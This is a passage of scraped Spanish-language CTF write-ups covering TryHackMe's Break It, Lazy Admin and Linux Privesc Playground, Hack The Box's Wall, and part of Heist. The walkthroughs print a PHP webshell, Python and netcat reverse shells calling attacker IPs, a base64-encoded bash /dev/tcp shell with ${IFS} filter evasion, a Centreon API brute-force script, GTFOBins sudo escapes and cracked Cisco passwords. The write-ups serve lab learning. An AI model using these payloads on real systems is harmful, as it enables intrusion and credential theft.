gNTQgNjUgMzIgNTIgNTMgMzIgNTEgNTEgMzIgNTMgNDkgMzIgNTUgNjUgMzIgNTIgNjUgMzIgNTEgNDkgMzIgNTQgNTIgMzIgNTMgNTEgMzIgNTIgNDkgMzIgNTQgNzAgMzIgNTQgNDkgMzIgNTEgNTAgMzIgNTMgNTQgMzIgNTEgNTMgMzIgNTIgNzAgMzIgNTQgNTcgMzIgNTIgNTAgMzIgNTEgNDggMzIgNTMgNTcgMzIgNTMgNTUgMzIgNTEgNTMgMzIgNTQgNjkgMzIgNTQgNTAgMzIgNTEgNTAgMzIgNTMgNTAgMzIgNTUgNTQgMzIgNTQgNTIgMzIgNTEgNTAgMzIgNTEgNTIgMzIgNTUgNDg 4- Vigenere Cipher\nroh gfh o nrtl purh qnnvkrx (key: tangodown) { Fase 03 - Base, Cipher, Bit Shift } #1 [Moderate] Reto\n2D 37 2B 19 31 99 31 B3 B2 AB A5 18 32 37 20 B3 B2 AC 2D 1A 31 B4 A1 3A A4 A3 9C B4 AD 36 AC 9E Solucion\nBlock Shift Left (1 vez) \u0026gt; Base64 \u0026gt; ROT13\n1- Bock Shift Left\n2- Base64 \u0026gt; ROT13 (CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)ROT13(true,true,13)\u0026amp;input=Wm5WMmMyY2dlV0owZG5BZ2VYWjRjaUJ1SUc5aVptWT0 #2 [Hard] Reto\n19 1A 1C 99 1C 9C A8 38 27 B2 34 27 B9 27 26 28 3C 3B AA 28 A5 AA 2A 29 3C 29 B2 B2 21 B1 AC A6 1C AC 29 A8 38 99 2C Solucion\nHex Workshop \u0026gt; new \u0026gt; Paste Special \u0026gt; CF_TEXT Marcar 'Interpret as a hexadecimal string' \u0026gt; Rotate to the left 8 bits \u0026gt; Base 58 \u0026gt; Caesar Cipher Shift 14\n1- Hex Workshop - Rotate Left 8 bits\n2- Base 58\n248389QpNehNsNLPxvUPKUTRxReeBcYM8YRQp3X 3- Caesar Cipher Shift 14 (dcode.fr)\nfuvsg nevguzrgvp yvxr n obff #3 [Insane] Reto\nA9 A8 2B EE 2A AA C9 C8 C9 AA A8 0F 2A 8A AA EE A9 8A CA A8 A9 4F 6D 46 E9 A8 A8 0F A9 8A 6D 86 A9 AA A9 26 2A 8A 48 E8 Solucion\nRotate to the left 8 bits (3 veces) \u0026gt; Base64 \u0026gt; Block Shift Left (2 veces) \u0026gt; Base85 \u0026gt; Caesar Cipher (Shift 13)\n1- Rotate to the left 8 bits (3 veces)\nMEYwQUNFNUExQTUwMTVEMzk2OEExMTk4MUM1QTBG 2- Base64\n0F0ACE5A1A5015D3968A11981C5A0F 3- Block Shift Left (2 veces)\n\u0026lt;+9hi@WNZ(F`qh\u0026lt; 4- Base85\nTbq bs fuvsf 5- Caesar Cipher (Shift 13)\nGod of shifs ","description":"Break It nos trae una serie de retos que vienen en tres fases, la primera codificacion en las distintas bases existentes, la segunda fase una serie de retos relacionado a codificacion y encriptacion en cipher, la tercera face pero no la mas facil una serie de retos de codificacion, encriptacion en cipher y bit shift.","id":177,"section":"posts","tags":["challenge"],"title":"TryHackMe - Break It","uri":"https://sckull.github.io/posts/breakit/"},{"content":"\rLazy Admin es una maquina de TryHackMe, descubrimos una base de datos y una vulnerabilidad en SweetRice. Ejecutamos una shell inversa con Sudo y Perl.\nRoom Titulo LazyAdmin Descripción Easy linux machine to practice your skills Puntos 110 Dificultad Facil Maker MrSeth6797 MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra dos puertos abiertos el http (80) y el ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 root@aoiri:~/tryhackme/lazyadmin# masscan -p1-65535,U:1-65535 10.10.68.91 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-12 04:49:57 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.68.91 Discovered open port 80/tcp on 10.10.68.91 # Nmap 7.80 scan initiated Wed Dec 11 22:50:33 2019 as: nmap -sV -sC -o nmap_scan 10.10.68.91 Nmap scan report for 10.10.68.91 Host is up (0.26s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA) | 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA) |_ 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 11 22:51:22 2019 -- 1 IP address (1 host up) scanned in 48.56 seconds WHATWEB Vemos que la pagina esta corriendo sobre un Apache 2.4.18.\nHTTP Al visitar la pagina nos muestra el tipico index de apache.\nGOBUSTER Utilizamos esta herramienta para poder obtener los directorios y archivos ue puedan ser interesantes.\n1 2 3 4 5 6 root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/ -x php,txt,html -q -t 15 -w /usr/share/wordlists/dirb/common.txt /content (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) root@aoiri:~/tryhackme/lazyadmin# Sweet Rice CMS /content Encontramos un CMS especificamente Sweet Rice, con un mensaje que indica que el sitio web esta en construccion.\nPasamos nuevamente gobuster sobre la direccion de SweetRice y econtramos distintos directorios relacionados con el gestor de contenidos.\n1 2 3 4 5 6 7 8 9 10 11 12 root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/content/ -x php,txt,html -q -t 15 -w /usr/share/wordlists/dirb/common.txt /_themes (Status: 301) /as (Status: 301) /attachment (Status: 301) /changelog.txt (Status: 200) /images (Status: 301) /inc (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /license.txt (Status: 200) root@aoiri:~/tryhackme/lazyadmin# Una direccion interesante es /as, contiene un panel de logeo, intentamos utilizar las credenciales por default pero no logramos acceder.\nBuscamos exploits que pudiesen afectar a este gestor de contenidos y encontramos distintas vulnerabilidades.\nSweetRice 1.5.1 - Backup Disclosure Una de ellas indica que existe un backup de mysql en el directorio /inc/mysql directorio que existe en esta pagina.\nDescargamos el archivo y al analizarlo encontramos que se hizo una insersion en la tabla options donde encontramos un nombre y una contraseña, las cuales podemos utilizar en el panel de logeo.\nBuscamos el hash en crackstation y obtuvimos la contraseña en texto plano:\nCredenciales:\nUser: manager\rPassword: Password123 SweetRice 1.5.1 - Arbitrary File Upload Utilizamos un exploit que afecta a este gestor de contenidos para subir una shell, antes de ejecutarlo agregamos la ip y un dominio a nuestro archivo hosts (lazyadmin.thm en mi caso) ya que nos pedira un dominio y no una IP. Tambien agregamos /content/ a los valores que contienen /as/ y /attachment/.\nCreamos un archivo en php de prueba:\n1 echo \u0026#34;\u0026lt;?php echo \u0026#39;:D\u0026#39;; ?\u0026gt;\u0026#34; \u0026gt; shellfoo.php5 Ejecutamos y vemos que se subio nuestro archivo:\nNuestro archivo de prueba:\nSubimos una webshell:\n1 2 3 4 5 6 7 8 9 \u0026lt;?php if(isset($_REQUEST[\u0026#39;cmd\u0026#39;])){ echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; $cmd = ($_REQUEST[\u0026#39;cmd\u0026#39;]); system($cmd); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; die; } ?\u0026gt; Ejecutamos un comando para obtener una shell inversa:\n1 python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.8.1.72\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; USER - Flag Nos movemos a la carpeta principal del usuario itguy y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una enumeracion rapida con el comando sudo -l -l, y vemos que hay un archivo que podemos ejecutar con perl con el comando sudo, a su vez este archivo ejecuta otro (/etc/copy.sh), este ultimo ejecuta un comando para obtener una shell inversa hacia una IP.\n/home/itguy/backup.pl\n1 2 3 #!/usr/bin/perl system(\u0026#34;sh\u0026#34;, \u0026#34;/etc/copy.sh\u0026#34;); copy.sh\n1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.0.190 5554 \u0026gt;/tmp/f El archivo backup.pl no puede ser modificado, pero el archivo copy.sh si, hicimos una pequeña prueba con un comentario en bash.\n1 echo \u0026#34;#foo\u0026#34; \u0026gt;\u0026gt; /etc/copy.sh Permisos copy.sh:\nAgregamos una shell inversa al archivo copy.sh:\n1 echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1337 \u0026gt;/tmp/f\u0026#34; \u0026gt; /etc/copy.sh Ejecutamos y obtenemos una shell inversa con el usuario root, junto con nuestra flag root.txt.\nFirefox Decrypt Dentro de la carpeta principal del usuario itguy encontramos la carpeta .mozilla/firefox/, utilizamos firefox_decrypt para obtener las contraseñas y usuarios guardados.\n","description":"Lazy Admin es una maquina de TryHackMe, descubrimos una base de datos y una vulnerabilidad en SweetRice. Ejecutamos una shell inversa con Sudo y Perl.","id":178,"section":"posts","tags":["SweetRice","firefox"],"title":"TryHackMe - Lazy Admin","uri":"https://sckull.github.io/posts/lazyadmin/"},{"content":"\rLinux Privesc Playground es una maquina de TryHackMe que presenta distintos ficheros SUID para practicar escalar privilegios en Linux.\nRoom Titulo Linux Privesc Playground Descripción A linux privilege escalation playground, filled with badly configured superuser permissions, incorrectly set SUID bits, and more! Puntos * Dificultad Facil Maker SherlockSec Linux Privesc Playground, contiene ficheros del tipo SUID los cuales al ejecutarlos, se obtiene permisos del usuario quien creo este fichero unicamente durante la ejecucion.\nLas credenciales de la maquina:\n1 user:password Para poder enumerar los ficheros del tipo SUID podemos utilizar los siguientes comandos:\n1 2 3 find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah find / -perm -u=s -type f 2\u0026gt;/dev/null De igual forma podemos utilizar sudo para poder ver que ficheros pueden ser ejecutados bajo el comando sudo.\n1 sudo -l -l Podemos ver que nos devuelve una lista de ficheros los cuales pueden ser utilizados para obtener privilegios de root.\nA continuacion se listan la solucion para alguno de ellos, se puede encontrar los comandos en la pagina GTFOBINS.\n/bin/apt-get* En el caso de este fichero al consultar sobre la existencia en el directorio que nos muestra el listado no existe en esa direccion. Utilizamos cp para copiar el acrhivo y lo colocamos en la direccion /bin/.\nComando:\n1 sudo /bin/apt-get update -o APT::Update::Pre-Invoke::= /bin/bash /usr/bin/aria2c Ya que podemos ejecutar este archivo con el comando sudo, podemos aprovechar las diferentes opciones que tiene el archivo. aria2c en su version 1.13.0.\nComando:\n1 sudo /usr/bin/aria2c -i /root/flag.txt /usr/sbin/arp Comando:\n1 LFILE=/root/flag.txt; sudo arp -v -f \u0026#34;$LFILE\u0026#34; /bin/ash Comando:\n1 sudo /bin/ash /usr/bin/awk Comando:\n1 sudo awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39; /usr/bin/base64 Comando:\n1 2 LFILE=/root/flag.txt sudo base64 \u0026#34;$LFILE\u0026#34; | base64 --decode /bin/bash Comando:\n1 sudo bash /bin/busybox Comando:\n1 sudo busybox sh /bin/cat Comando:\n1 sudo /bin/cat /root/flag.txt /bin/chmod Comando:\n1 2 LFILE=/root/flag.txt sudo chmod 0777 $LFILE /bin/chown Comando:\n1 2 LFILE=/root/flag.txt sudo /bin/chown $(id -un):$(id -gn) $LFILE /bin/cp Comando:\n1 2 3 4 FLAG=/tmp/flag.txt TF=/root/flag.txt sudo /bin/cp $TF $FLAG cat $FLAG /usr/bin/cpan Comando:\n1 sudo cpan Elegimos no a las opciones hasta CPAN site, entonces \u0026lsquo;Autoconfiguration complete.\u0026rsquo; y escribimos el siguiente comando:\n1 ! exec \u0026#39;/bin/bash\u0026#39; /bin/crontab Comando:\n1 sudo /bin/crontab -e Seleccionamos el editor Vim, presionamos ESC y escribimos :!sh.\n/usr/bin/cut Comando:\n1 2 LFILE=/root/flag.txt sudo cut -d \u0026#34;\u0026#34; -f1 \u0026#34;$LFILE\u0026#34; ","description":"Linux Privesc Playground es una maquina de TryHackMe que presenta distintos ficheros SUID para practicar escalar privilegios en Linux.","id":179,"section":"posts","tags":["GTFObins","SUID"],"title":"TryHackMe - Linux Privesc Playground","uri":"https://sckull.github.io/posts/linuxprivescplayground/"},{"content":"\rWall presenta Centreon, en esta version realizamos un ataque de fuerza bruta a la API para encontrar las credenciales del administrador. Además enocntramos una vulnerabilidad RCE por la cual obtuvimos acceso a la maquina. Enumeramos los ficheros SUID y escalamos privilegios por Screen.\nInformacion de la Maquina Nombre Wall OS Linux Puntos 30 Dificultad Media IP 10.10.10.157 Maker askar\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.5, 4.6, 7.3, 2.7, 5.4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 root@kali:~/htb/wall# masscan -p1-65535,U:1-65535 10.10.10.157 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-25 07:02:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.157 Discovered open port 80/tcp on 10.10.10.157 # Nmap 7.80 scan initiated Wed Sep 25 03:46:47 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.157 Warning: 10.10.10.157 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.157 Host is up (0.19s latency). Not shown: 65530 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 32187/tcp filtered unknown 33879/tcp filtered unknown 48249/tcp filtered unknown # Nmap done at Wed Sep 25 03:48:33 2019 -- 1 IP address (1 host up) scanned in 106.19 seconds # Nmap 7.80 scan initiated Wed Sep 25 03:51:32 2019 as: nmap -sV -sC -p22,80 -o nmap_scan 10.10.10.157 Nmap scan report for 10.10.10.157 Host is up (0.24s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA) | 256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA) |_ 256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Sep 25 03:51:50 2019 -- 1 IP address (1 host up) scanned in 18.00 seconds HTTP - Puerto 80 La pagina web esta corriendo en un Apache/2.4.29.\nGOBUSTER Gobuster nos muestra las siguientes rutas de la pagina web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 root@kali:~/htb/wall# gobuster dir -u http://10.10.10.157/ -w /usr/share/wordlists/dirb/common.txt -n -x php,txt,html -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.157/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/25 03:53:54 Starting gobuster =============================================================== /aa.php /index.html /index.html /monitoring /panel.php /server-status =============================================================== 2019/09/25 03:56:21 Finished =============================================================== /aa.php /monitoring /panel.php Realizamos nuevamente una busqueda con un diccionario diferente y encontramos las siguientes rutas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 root@kali:~/htb/wall# gobuster dir -u http://10.10.10.157/ -w /usr/share/wordlists/subdscan.txt -n -x php,txt,html -t 15 -z =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.157/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/subdscan.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/27 01:12:38 Starting gobuster =============================================================== /aa.php /centreon /index.html /monitoring /panel.php =============================================================== 2019/09/27 01:17:42 Finished =============================================================== Centreon - RCE /centreon Encontramos la plataforma de centreon de codigo abierto para el monitoreo de software o administracion de infraestructura en su version 19.04.0, al investigar un poco acerca de esta plataforma y su version vemos que existe una vulnerabilidad (CVE-2019-13024) en la plataforma que permite ejecutar codigo remoto (RCE). Para explotar esta vulnerabilidad necesitamos las credenciales de centreon.\nAPI - Centreon Utilizamos python para hacer un ataque de fuerza bruta contra la plataforma utilizando el diccionario rockyou.txt con la siguiente configuracion y utilizando la API de centreon.\nDocumentation Centreon - API\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #!/usr/bin/python import requests import json filepath = \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39; url = \u0026#39;http://10.10.10.157/centreon/api/index.php?action=authenticate\u0026#39; with open(filepath) as fp: line = fp.readline() while line:\tpassword_r = \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;_pass_\u0026#34;}\u0026#39;.replace(\u0026#39;_pass_\u0026#39;, line.strip()) data = json.loads(password_r) response = requests.post(url, data=data) result = response.json() if result == \u0026#34;Bad credentials\u0026#34;: print(\u0026#34;Password Incorrecta\u0026#34;) elif result == \u0026#34;Bad parameters\u0026#34;: print(\u0026#34;Error en request\u0026#34;) else:\tprint(\u0026#34;User:Pass \u0026#34; + str(data[\u0026#34;username\u0026#34;]+\u0026#34;:\u0026#34;+str(data[\u0026#34;password\u0026#34;])))\tbreak line = fp.readline() Encontramos la contraseña para el usuario admin:password1:\nHydra Una manera mas facil y sencilla de hacerlo es con hydra:\n1 hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 10.10.10.157 http-post-form \u0026#34;/centreon/api/index.php?action=authenticate:username=^USER^\u0026amp;password=^PASS^:Bad credentials\u0026#34; RCE - Explotacion | Shell Para explotar la vulnerabilidad de esta plataforma utilizamos el exploit Centreon RCE, al utilizar el exploit y pasarle las credenciales y la url no ejecuta comandos dentro de la maquina, para poder ejecutar comandos utilizamos base64 y shell evasion ya que no permite ejecutar comandos en texto plano.\nInternal Variables\nPrimero codificamos nuestra shell inversa en base64 omitiendo los saltos de linea, luego creamos nuestro comando para ejecucion en la plataforma en donde cada espacio es ${IFS}, y se agrega de ultimo punto y coma (;) ya que la vulnerabilidad permite ejecutar comandos con ciertos parametros (-v /usr/local/centreon/filesGeneration/engine/1/centengine.DEBUG 2\u0026gt;\u0026amp;1) y agregamos esto ultimo para que no ejecute los parametros por default.\n1 2 3 echo -n \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.145/7878 0\u0026gt;\u0026amp;1\u0026#34; | base64 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx echo${IFS}-n${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS}; Agregamos el siguiente codigo por encima de payload_info:\n1 payload_shell = str(repr(\u0026#34;echo${IFS}-n${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS};\u0026#34;)).strip(\u0026#34;\u0026#39;\u0026#34;) Y dentro de payload_info cambiamos:\n1 2 3 \u0026#34;nagios_bin\u0026#34;: \u0026#34;ncat -e /bin/bash {0} {1} #\u0026#34;.format(ip, port), por: \u0026#34;nagios_bin\u0026#34;: \u0026#34;{}\u0026#34;.format(payload_shell), Ejecutamos nuestro exploit los parametros de IP y Puerto no importan ya que hemos codificado nuestra shell inversa:\nObtenemos una shell como usuario www-data:\nPrivilege Escalation Como en cualquier maquina realizamos una enumeracion de archivos y binarios que puedan ayudarnos a escalar privilegios a otro usuario en este caso fue distinto ya que la maquina contenia un binario vulnerable que permitia escalar privilegios de administracion.\nSUID - Screen 4.5.0 Trasladamos y ejecutamos el exploit en la maquina y obtenemos una shell con el usuario root y las flags user.txt y root.txt.\n","description":"Wall presenta Centreon, en esta version realizamos un ataque de fuerza bruta a la API para encontrar las credenciales del administrador. Además enocntramos una vulnerabilidad RCE por la cual obtuvimos acceso a la maquina. Enumeramos los ficheros SUID y escalamos privilegios por Screen.","id":180,"section":"posts","tags":["centreon","suid"],"title":"Hack The Box - Wall","uri":"https://sckull.github.io/posts/wall/"},{"content":"\rInicialmente se muestra un fichero en la pagina web el cual contiene credenciales cisco encriptadas, con ellas pudimos enumerar algunos usuarios con Impacket y con WinRM obtener acceso. Enumerando los archivos de la pagina inicial encontramos el hash del Adminstrador el cual crackeamos y obtuvimos acceso privilegiado.\nInformacion de la Maquina Nombre Heist OS Windows Puntos 20 Dificultad Facil IP 10.10.10.149 Maker MinatoTW\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.8, 7.2, 4.4, 5.6, 2.8],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[6, 9, 3, 7, 1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 root@kali:~/htb/heist# masscan -p1-65535,U:1-65535 10.10.10.149 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-21 06:23:36 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49668/tcp on 10.10.10.149 Discovered open port 445/tcp on 10.10.10.149 Discovered open port 135/tcp on 10.10.10.149 Discovered open port 5985/tcp on 10.10.10.149 Discovered open port 80/tcp on 10.10.10.149 # Nmap 7.70 scan initiated Wed Aug 21 02:32:58 2019 as: nmap -sC -sV -p 49668,445,135,5985,80 -o nmap.scan 10.10.10.149 Nmap scan report for 10.10.10.149 Host is up (0.39s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49668/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 32s, deviation: 0s, median: 32s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-08-21 02:34:36 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 21 02:34:42 2019 -- 1 IP address (1 host up) scanned in 103.97 seconds HTTP - PUERTO 80 Al visitar este puerto nos muestra un panel de inicio de sesion de una plataforma.\nIniciamos sesion como invitado (Login as guest) y nos redirige a una nueva pagina issues.php en la cual contiene un chat de un cliente que muestra los errores que tuvo con su router cisco y una lista de errores dentro de un archivo.\nArchivo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 version 12.2 no service pad service password-encryption ! isdn switch-type basic-5ess ! hostname ios-1 ! security passwords min-length 12 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 ! username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 ! ! ip ssh authentication-retries 5 ip ssh version 2 ! ! router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Â mask 300.255.255.0 timers bgp 3 9 redistribute connected ! ip classless ip route 0.0.0.0 0.0.0.0 192.168.0.1 ! ! access-list 101 permit ip any any dialer-list 1 protocol ip list 101 ! no ip http server no ip http secure-server ! line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh Encontramos dentro del archivo usuarios y contraseñas:\n$1$pdQG$o8nrSzsGXeaduXrjlvKc91\rusername rout3r password 7 0242114B0E143F015F5D1E161713\rusername admin privilege 15 password 7 02375012182C1A1D751618034F36415408 La primera contraseña la crackeamos con hashcat:\n1 stealth1agent:$1$pdQG$o8nrSzsGXeaduXrjlvKc91 Las dos ultimas utilizamos un script que nos devuelve el valor del hash, este hash es de tipo 7 de Cisco:\nDecode Cisco Password Hash\nCisco Password\nPassword Cracker\n1 2 $uperP@ssword:0242114B0E143F015F5D1E161713 Q4)sJu\\Y8qz*A3?d:02375012182C1A1D751618034F36415408 SMBMAP Ahora que tenemos usuairos y contraseñas intentamos listar sharenames, con el unico usuario con el cual nos dejó fue con el usuario hazard.\nIMPACKET - LOOKUPSID Impacket toolkit Utilizamos el script lookupsid.py de impacket para poder obtener los usuarios o grupo de usuarios dentro de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 